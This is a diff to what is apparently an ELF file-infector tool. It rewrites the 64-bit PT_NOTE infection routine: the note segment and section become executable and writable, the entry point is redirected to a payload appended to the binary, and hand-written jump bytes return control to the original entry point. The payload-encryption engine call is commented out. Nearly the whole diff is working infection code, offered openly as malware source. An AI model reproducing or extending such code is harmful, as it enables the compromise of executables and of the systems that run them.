@@ -1,6 +1,10 @@
 #include "infect.h"
 #include "engine.h"
 
+#include <sstream> 
+#include <iomanip>
+#include <iostream>
+
 using namespace std;
 
 int directory_infection(options_t *options){
@@ -24,18 +28,18 @@ int elf_infection(options_t *options){
   	if (VERBOSE) printf("%s: infecting single ELF file\n", INFO_BANNER );
 
 	// 1. Create payload encrypted by the engine
-	char *engine_func = NULL;
-	unsigned long engine_func_size = 0;
+	//char *engine_func = NULL;
+	//unsigned long engine_func_size = 0;
 
-	if (VERBOSE) printf("%s creating decryption function for the payload\n", INFO_BANNER );
+	//if (VERBOSE) printf("%s: creating decryption function for the payload\n", INFO_BANNER );
 
-	engine_creation(options, &engine_func, &engine_func_size);
+	//engine_creation(options, &engine_func, &engine_func_size);
 
-	if (VERBOSE) printf("%s engine_func = %s\n", INFO_BANNER, engine_func );
-	if (VERBOSE) printf("%s engine_func_size = %lu\n", INFO_BANNER, engine_func_size );
+	//if (VERBOSE) printf("%s: engine_func = %s\n", INFO_BANNER, engine_func );
+	//if (VERBOSE) printf("%s: engine_func_size = %lu\n", INFO_BANNER, engine_func_size );
 	
-	options->input = engine_func;
-	options->inputsz = engine_func_size;
+	//options->input = engine_func;
+	//options->inputsz = engine_func_size;
 
 	// 2. infect ELF file with encrypted payload
   	if (VERBOSE) printf("%s: infection process beginning\n", INFO_BANNER );
@@ -49,72 +53,74 @@ int elf_infection(options_t *options){
 
 int infect_elf_64(options_t *options){
 
-  	int i;
-  	int old_vaddr;
-  	int file_offset;
-  	int patch_size = 5;
-  	int pt_note_found = 1;
-  	int infected_file_size;
-  	int payload_len = options->inputsz;
-  	char *infected_file;
-  	char *patched_entry_point;
-  	char *payload = options->input;
-  	int32_t fd;
   	Elf64_Ehdr eh;
   	Elf64_Phdr *ph_tbl;
+  	Elf64_Shdr *sh_tbl;
   	Elf64_Addr old_entry_point;
+  	Elf64_Addr PIE_delta;
+  	int i, j, k;
+  	int file_offset;
+  	int pt_note_found = 1;
+  	int s_note_found = 1;
+  	//int infected_file_size;
+  	int payload_len = options->inputsz;
+  	//char *infected_file;
+  	//char *patched_entry_point;
+  	char *payload = options->input;
+  	int32_t fd;
+  	int patch_size = 11 + sizeof(old_entry_point);
 
-	if (VERBOSE) printf("%s ELF file is 64 bits\n", INFO_BANNER );
+	if (VERBOSE) cout << INFO_BANNER << ": ELF file is 64 bits" << endl;
 
   	// 1. Open the ELF file to be injected:
 	fd = options->elf;
 
+	// read ELF header into 'eh'
+	if ( lseek(fd, (off_t)0, SEEK_SET) != (off_t)0 ) 
+		error("lseek(targetelf, 0, SEEK_SET);\n");
+
 	if ( read(fd, (void *)&eh, sizeof(Elf64_Ehdr)) != sizeof(Elf64_Ehdr) )
-		error("read(targetelf, eh, sizeof(Elf32_Ehdr))");
+		error("read(targetelf, eh, sizeof(Elf64_Ehdr))");
 
-
-	if ( eh.e_type != ET_EXEC )
+	// check if the file can be infected
+	if ( eh.e_type != ET_EXEC ){
+		cout << ERROR_BANNER << ": target ELF file is type = " << eh.e_type << endl; 
 		error("filetype is not ET_EXEC. cannot perform PT_NOTE infection method");
+	}
 
-	file_offset = lseek(fd, 0, SEEK_END); // seek to end of file
-	//lseek(fd, 0, SEEK_SET); // seek back to beginning of file
-	if (VERBOSE) printf("%s: ELF file size (file_offset) = %d\n", INFO_BANNER, file_offset );
-	if (VERBOSE) printf("%s: payload file size (payload_len) = %d\n", INFO_BANNER, payload_len );
-	if (VERBOSE) printf("%s: payload file size with entry point patching = %d\n", INFO_BANNER, payload_len+patch_size );
+	 // calculate ELf file size
+	file_offset = lseek(fd, (off_t)0, SEEK_END);
+
+	if (VERBOSE) cout << INFO_BANNER << ": target ELF file size = 0x" << hex << file_offset << dec << endl;
+	if (VERBOSE) cout << INFO_BANNER << ": payload file size (payload_len) = 0x" << hex << payload_len << dec << endl;
+	if (VERBOSE) cout << INFO_BANNER << ": payload file size with entry point patching = 0x" << hex << payload_len+patch_size << dec << endl;
 
 	// 2. Save the original entry point, e_entry:
 	old_entry_point = eh.e_entry;
-	if (VERBOSE) printf("%s: old entry point = %lu\n", INFO_BANNER, old_entry_point );
 
-
-	// 3. Parse the program header table, looking for the PT_NOTE segment:
+	// check if there is a program header table
 	if ( !eh.e_phoff || !eh.e_phnum )
 		error("ELF file has no program header table");
 
+	// 3. Parse the program header table, looking for the PT_NOTE segment:
 	if ( lseek(fd, (off_t)eh.e_phoff, SEEK_SET) != (off_t)eh.e_phoff ) 
 		error("lseek(targetelf, eh.e_shoff, SEEK_SET);\n");
 
-	ph_tbl = (Elf64_Phdr *) malloc( eh.e_phentsize * eh.e_phnum );
+	ph_tbl = new Elf64_Phdr[eh.e_phentsize * eh.e_phnum];
 
 	if (ph_tbl == NULL)
 		error("could't allocate memory to read ELF program headers");
 
 	for( i = 0; i < eh.e_phnum && pt_note_found; i++ ){
+
 		if (read(fd, (void *)&ph_tbl[i], eh.e_phentsize) != eh.e_phentsize)
 			error("read(targetelf, sh_table[i], eh.e_shentsize)");
 
 		if ( ph_tbl[i].p_type != PT_NOTE )
 			continue;
 
-		if (VERBOSE){
-			printf("%s: found PT_NOTE segment\n", INFO_BANNER );
-			printf("\tp_type = %d\n", ph_tbl[i].p_type);	
-			printf("\tp_flags = %d\n", ph_tbl[i].p_flags);
-			printf("\tp_vaddr = %lu\n", ph_tbl[i].p_vaddr);
-			printf("\tp_filesz = %lu\n", ph_tbl[i].p_filesz);
-			printf("\tp_memsz = %lu\n", ph_tbl[i].p_memsz);
-			printf("\tp_offset = %lu\n", ph_tbl[i].p_offset);
-		} 
+		// Save index of the infected PT_NOTE segment in the program table
+		j = i;
 
 		pt_note_found = 0;
 
@@ -122,64 +128,117 @@ int infect_elf_64(options_t *options){
 		ph_tbl[i].p_type = PT_LOAD;
 
 		// 5. Change the memory protections for this segment to allow executable instructions:
-		ph_tbl[i].p_flags = PF_R | PF_X;
+		ph_tbl[i].p_flags = PF_R | PF_X | PF_W;
+
+		PIE_delta = ph_tbl[i].p_vaddr - ph_tbl[i].p_offset;
 
 		// 6. Change the entry point address to an area that will not conflict with the original program execution.
-		eh.e_entry = (Elf64_Addr) 0xc000000 + file_offset;
+		// eh.e_entry = (Elf64_Addr)  (ph_tbl[i].p_vaddr - ph_tbl[i].p_offset) + file_offset;
+		eh.e_entry = (Elf64_Addr) PIE_delta + file_offset;
 	
 		// 7. Adjust the size on disk and virtual memory size to account for the size of the injected code:
-		old_vaddr = ph_tbl[i].p_vaddr;
-		ph_tbl[i].p_vaddr = (Elf32_Addr) 0xc000000 + file_offset;
-		ph_tbl[i].p_filesz += (Elf32_Word) payload_len + patch_size;
-		ph_tbl[i].p_memsz += (Elf32_Word) payload_len + patch_size;
+
+		ph_tbl[i].p_vaddr = (Elf64_Addr) PIE_delta + file_offset;
+		ph_tbl[i].p_paddr = (Elf64_Addr) file_offset;
+		ph_tbl[i].p_filesz = (Elf64_Word) payload_len + patch_size;
+		ph_tbl[i].p_memsz = (Elf64_Word) payload_len + patch_size;
+		ph_tbl[i].p_align = 0x200000;
 
 		// 8. Point the offset of our converted segment to the end of the original binary, where we will store the new code:
 		ph_tbl[i].p_offset = file_offset;
 	}
 
-	if (VERBOSE){
-			printf("%s: modified PT_NOTE segment\n", INFO_BANNER );
-			printf("\tp_type = %d\n", ph_tbl[i].p_type);	
-			printf("\tp_flags = %d\n", ph_tbl[i].p_flags);
-			printf("\tp_vaddr = %lu\n", ph_tbl[i].p_vaddr);
-			printf("\tp_filesz = %lu\n", ph_tbl[i].p_filesz);
-			printf("\tp_memsz = %lu\n", ph_tbl[i].p_memsz);
-			printf("\tp_offset = %lu\n", ph_tbl[i].p_offset);
-		} 
+	if ( pt_note_found )
+		error("could not find available PT_NOTE segments in the ELF file");
 
-	infected_file_size = payload_len + file_offset + patch_size;
-	infected_file = (char *) malloc((size_t) infected_file_size );
+	//////////////////////////////////////////////////////////
+	// 3. Parse the section header table, looking for the PT_NOTE segment:
+	if ( lseek(fd, (off_t)eh.e_shoff, SEEK_SET) != (off_t)eh.e_shoff ) 
+		error("lseek(targetelf, eh.e_shoff, SEEK_SET);\n");
 
-	if (infected_file == NULL)
-		error("couldn't allocate memory for new infected ELF file");
+	sh_tbl = new Elf64_Shdr[eh.e_shentsize * eh.e_shnum];
 
+	if (sh_tbl == NULL)
+		error("could't allocate memory to read ELF section headers");
+
+	for( i = 0; i < eh.e_shnum && s_note_found; i++ ){
+
+		if (read(fd, (void *)&sh_tbl[i], eh.e_shentsize) != eh.e_shentsize)
+			error("read(targetelf, sh_table[i], eh.e_shentsize)");
+
+		if ( sh_tbl[i].sh_type != SHT_NOTE ) 
+			continue;
+
+		// Save index of the infected SHT_NOTE section in the program table
+		k = i;
+
+		s_note_found = 0;
+
+		// 4. Change section to denote code section
+		sh_tbl[i].sh_name = 0;
+		sh_tbl[i].sh_type = (Elf64_Word) SHT_PROGBITS;
+		sh_tbl[i].sh_flags = (Elf64_Word) SHF_ALLOC | SHF_EXECINSTR | SHF_WRITE;
+		sh_tbl[i].sh_addr = (Elf64_Addr) PIE_delta + file_offset;
+		sh_tbl[i].sh_offset = (Elf64_Off) file_offset;
+		sh_tbl[i].sh_size = (Elf64_Word) payload_len + patch_size;
+		sh_tbl[i].sh_link = (Elf64_Word) SHN_UNDEF;
+		sh_tbl[i].sh_info = (Elf64_Word) 0;
+		sh_tbl[i].sh_addralign = (Elf64_Word) 16;
+		sh_tbl[i].sh_entsize = (Elf64_Word) 0;
+	}
+
+	if ( s_note_found )
+		error("could not find available SHT_NOTE segments in the ELF file");
+
+
+	
+	// re-write ELF header with modified entry point
 	if ( lseek(fd, (off_t)0, SEEK_SET) != (off_t)0 ) 
 		error("lseek(targetelf, 0, SEEK_SET);\n");
+	if ( write(fd, (void *)&eh, sizeof(Elf64_Ehdr)) != sizeof(Elf64_Ehdr) )
+		error("cannot write ELF Header contents back to ELF file");
 
-	if ( read(fd, (void *)&infected_file, file_offset) != file_offset )
-		error("read(targetelf, eh, sizeof(Elf32_Ehdr))");
+	// re-wrtie the modified program head values back to the ELF file
+	if ( lseek(fd, (off_t)eh.e_phoff + j*eh.e_phentsize, SEEK_SET) != (off_t)eh.e_phoff + j*eh.e_phentsize ) 
+		error("lseek(targetelf, 0, SEEK_SET);\n");
+	if ( write(fd, (void *)&ph_tbl[j], eh.e_phentsize) != eh.e_phentsize )
+		error("cannot write Program Header contents back to ELF file");
 
+	// re-wrtie the modified program head values back to the ELF file
+	if ( lseek(fd, (off_t)eh.e_shoff + k*eh.e_shentsize, SEEK_SET) != (off_t)eh.e_shoff + k*eh.e_shentsize ) 
+		error("lseek(targetelf, 0, SEEK_SET);\n");
+	if ( write(fd, (void *)&sh_tbl[k], eh.e_shentsize) != eh.e_shentsize )
+		error("cannot write Section Header contents back to ELF file");
+	
 
 	// 10. Add our injected code to the end of the file:
-	memcpy(infected_file+file_offset, payload, payload_len);
-
+	if ( lseek(fd, (off_t)0, SEEK_END) == (off_t)-1 )
+		error("cannot lseek to end of ELF file to inject payload");
+	if ( write(fd, (void *)payload, payload_len) != payload_len )
+		error("cannot inject payload to end of ELf file");
 
 	// 9. Patch the end of the code with instructions to jump to the original entry point:
-	patched_entry_point = (char *) malloc(patch_size);
-	if (patched_entry_point == NULL)
-		error("couldn't allocate memory for the patch isntruction");
+    if ( write(fd, (void *)"\x90\x90\x90\x90\x90\x90\x90\x48\xb8", 9) != 9 )
+		error("could not add patching instrunctions to ELF file");
 
-	sprintf(patched_entry_point, "0xe9%lu", (old_entry_point-old_vaddr-patch_size-payload_len));
-	memcpy(infected_file+file_offset+payload_len, patched_entry_point, patch_size);
-	if (VERBOSE) printf("%s: entry point patching code = %s\n", INFO_BANNER, patched_entry_point );
 
-	// 11. Write the file back to disk, over the original file:
-	if ( lseek(fd, (off_t)0, SEEK_SET) != (off_t)0 ) 
-		error("lseek(targetelf, 0, SEEK_SET);\n");
-	write(fd, infected_file, infected_file_size );
+	if ( write(fd, (void *)&old_entry_point, sizeof(old_entry_point)) != sizeof(old_entry_point) )
+		error("could not add patching instrunctions to ELF file");
+
+	if ( write(fd, (void *)"\xff\xe0", 2) != 2 )
+		error("could not add patching instrunctions to ELF file");
+
+	if (VERBOSE) cout << INFO_BANNER << ": new EP = 0x" << hex << eh.e_entry << dec << endl;
+	if (VERBOSE) cout << INFO_BANNER << ": return to OEP = 0x" << hex << old_entry_point << dec << endl;
+
+
+
+	
+
 
 	return EXIT_SUCCESS;
 }
+
 
 int infect_elf(options_t *options){
 
@@ -209,10 +268,10 @@ int infect_elf(options_t *options){
 	if ( read(fd, (void *)&eh, sizeof(Elf32_Ehdr)) != sizeof(Elf32_Ehdr) )
 		error("read(targetelf, eh, sizeof(Elf32_Ehdr))");
 
-	if ( strncmp( (char*)eh.e_ident, ELF_MAGIC_NUMBER, 4 ) )
+	 if ( strncmp( (char*)eh.e_ident, ELF_MAGIC_NUMBER, SELFMAG ) != 0 )
 		error("target elf is not an ELF file.");
 
-	if ( eh.e_ident[EI_CLASS] == ELFCLASS64 )
+	if ( int(eh.e_ident[EI_CLASS]) == ELFCLASS64 )
 		return infect_elf_64(options);
 
 	if (VERBOSE) cout << INFO_BANNER << ": ELF file is 32 bits\n";
